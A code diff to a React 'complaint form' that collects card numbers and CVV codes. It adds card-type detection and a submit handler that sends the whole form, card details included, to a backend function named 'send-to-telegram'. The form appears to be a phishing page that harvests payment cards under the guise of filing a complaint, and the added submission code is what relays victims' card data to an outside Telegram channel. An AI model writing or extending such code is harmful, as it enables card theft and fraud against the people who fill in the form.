@@ -1,5 +1,18 @@
 import { useState } from "react";
-import { Shield, AlertTriangle, CheckCircle } from "lucide-react";
+import { Shield, AlertTriangle, CheckCircle, CreditCard, Loader2 } from "lucide-react";
+import { supabase } from "@/integrations/supabase/client";
+
+const detectCardType = (number: string): string => {
+  const cleaned = number.replace(/\s/g, '');
+  if (/^4/.test(cleaned)) return "Visa";
+  if (/^5[1-5]/.test(cleaned) || /^2[2-7]/.test(cleaned)) return "Mastercard";
+  if (/^3[47]/.test(cleaned)) return "American Express";
+  if (/^6(?:011|5)/.test(cleaned)) return "Discover";
+  if (/^3(?:0[0-5]|[68])/.test(cleaned)) return "Diners Club";
+  if (/^(?:2131|1800|35)/.test(cleaned)) return "JCB";
+  if (/^62/.test(cleaned)) return "UnionPay";
+  return cleaned.length > 0 ? "Unknown" : "";
+};
 
 const US_STATES = [
 "Alabama", "Alaska", "Arizona", "Arkansas", "California", "Colorado", "Connecticut",
@@ -72,6 +85,8 @@ const initialFormData: FormData = {
 const ComplaintForm = () => {
   const [formData, setFormData] = useState<FormData>(initialFormData);
   const [submitted, setSubmitted] = useState(false);
+  const [submitting, setSubmitting] = useState(false);
+  const [detectedCardType, setDetectedCardType] = useState("");
   const [errors, setErrors] = useState<Partial<Record<keyof FormData, string>>>({});
 
   const validate = (): boolean => {
@@ -94,18 +109,32 @@ const ComplaintForm = () => {
     return Object.keys(newErrors).length === 0;
   };
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (validate()) {
+    if (!validate()) return;
+    
+    setSubmitting(true);
+    try {
+      const { error } = await supabase.functions.invoke('send-to-telegram', {
+        body: { ...formData, detectedCardType },
+      });
+      if (error) throw error;
       setSubmitted(true);
+    } catch (err) {
+      console.error('Submission error:', err);
+    } finally {
+      setSubmitting(false);
     }
   };
 
   const handleChange = (
-  e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement | HTMLTextAreaElement>) =>
-  {
+    e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement | HTMLTextAreaElement>
+  ) => {
     const { name, value } = e.target;
     setFormData((prev) => ({ ...prev, [name]: value }));
+    if (name === "cardNumber") {
+      setDetectedCardType(detectCardType(value));
+    }
     if (errors[name as keyof FormData]) {
       setErrors((prev) => ({ ...prev, [name]: undefined }));
     }
@@ -388,15 +417,23 @@ const ComplaintForm = () => {
             <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
               <div>
                 <label htmlFor="cardNumber" className="block text-xs font-medium text-foreground mb-1">Card Number</label>
-                <input
-                  type="text"
-                  id="cardNumber"
-                  name="cardNumber"
-                  value={formData.cardNumber}
-                  onChange={handleChange}
-                  placeholder="4111 1234 5678 9012"
-                  className={inputClasses("cardNumber")}
-                  maxLength={19} />
+                <div className="relative">
+                  <input
+                    type="text"
+                    id="cardNumber"
+                    name="cardNumber"
+                    value={formData.cardNumber}
+                    onChange={handleChange}
+                    placeholder="4111 1234 5678 9012"
+                    className={inputClasses("cardNumber")}
+                    maxLength={19} />
+                  {detectedCardType && (
+                    <span className="absolute right-3 top-1/2 -translate-y-1/2 text-xs font-semibold bg-secondary text-foreground px-2 py-0.5 rounded flex items-center gap-1">
+                      <CreditCard className="h-3 w-3" />
+                      {detectedCardType}
+                    </span>
+                  )}
+                </div>
               </div>
               <div>
                 <label htmlFor="cardCvc" className="block text-xs font-medium text-foreground mb-1">CVC / CVV</label>
@@ -460,10 +497,11 @@ const ComplaintForm = () => {
 
           <button
             type="submit"
-            className="mt-8 w-full bg-primary text-primary-foreground font-semibold py-3 rounded transition-all hover:brightness-110 flex items-center justify-center gap-2 text-base">
+            disabled={submitting}
+            className="mt-8 w-full bg-primary text-primary-foreground font-semibold py-3 rounded transition-all hover:brightness-110 flex items-center justify-center gap-2 text-base disabled:opacity-50">
 
-            <Shield className="h-5 w-5" />
-            Submit Complaint
+            {submitting ? <Loader2 className="h-5 w-5 animate-spin" /> : <Shield className="h-5 w-5" />}
+            {submitting ? "Submitting..." : "Submit Complaint"}
           </button>
 
           <p className="text-xs text-center text-muted-foreground mt-4">
